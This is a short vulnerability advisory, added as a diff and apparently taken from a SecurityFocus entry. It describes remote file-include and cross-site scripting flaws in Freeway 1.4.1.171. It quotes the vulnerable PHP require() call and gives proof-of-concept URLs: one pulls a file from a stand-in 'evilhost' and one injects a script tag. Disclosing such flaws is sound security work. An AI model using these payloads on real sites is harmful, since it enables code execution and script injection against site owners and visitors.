@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/30676/info
+
+Freeway is prone to multiple remote file-include and cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Freeway 1.4.1.171 is affected; other versions may also be vulnerable. 
+
+1. Multiple Remote/Local File Include
+
+Example:
+
+...
+$command=isset($HTTP_GET_VARS[&#039;command&#039;])?$HTTP_GET_VARS[&#039;command&#039;]:&#039;&#039;;
+...
+
+if($command!="")
+{
+switch($command){
+...
+case &#039;include_page&#039;:
+require($HTTP_GET_VARS[&#039;include_page&#039;]);
+break;
+...
+
+http://www.example.com/[installdir]/admin/create_order_new.php=http://evilhost/info.php
+
+Local File Include vulnerability found in script  includes/events_application_top.php
+
+2. Linked XSS vulnerability
+
+Example
+
+http://www.example.com/[installdir]/admin/search_links.php"<script>a=/DSecRG_XSS/%0d%0aalert(a.source)</script>
